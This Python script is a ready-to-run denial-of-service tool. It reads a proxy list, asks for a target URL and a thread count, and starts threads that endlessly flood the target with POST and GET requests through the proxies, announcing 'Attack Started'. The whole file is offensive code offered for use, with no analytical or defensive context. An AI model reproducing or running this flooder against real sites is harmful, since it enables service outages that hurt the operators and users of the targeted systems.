import os

print("Installing colorama, threading, requests, time...")

os.system("pip install colorama ; pip install threading ; pip install requests ; pip install time")

print("Installed colorama, threading, requests, time!")

os.system("clear")

print("Starting...")

import requests

from colorama import Fore

from threading import Thread

with open('proxy.txt') as f:
    
    proxies = f.read().splitlines()

url = input('Url: ')

thrnom = input('Threads: ')

num = 0

def ddos():
    
    global proxies
    
    global num
    
    while True:
        
        for proxy in proxies:
                
                try:
                    
                    response = requests.post(url, proxies={'https': proxy}, timeout=1)
                    response = requests.get(url, proxies={'https': proxy}, timeout=1)
                    
                    if num == 1:
                        
                        num = 1
                        
                    else:
                        
                        os.system("clear")
                        
                        print(f'{Fore.YELLOW}======>Attack Started<======')
                        
                        num = 1
                        
                except:
                    
                    if num == 1:
                        
                        num = 1
                        
                    else:
                        
                        os.system("clear")
                        
                        print(f'{Fore.YELLOW}======>Attack Started<======')
                        
                        num = 1
        
for i in range(int(thrnom)):
    
    thr = Thread(target = ddos)
    
    thr.start()
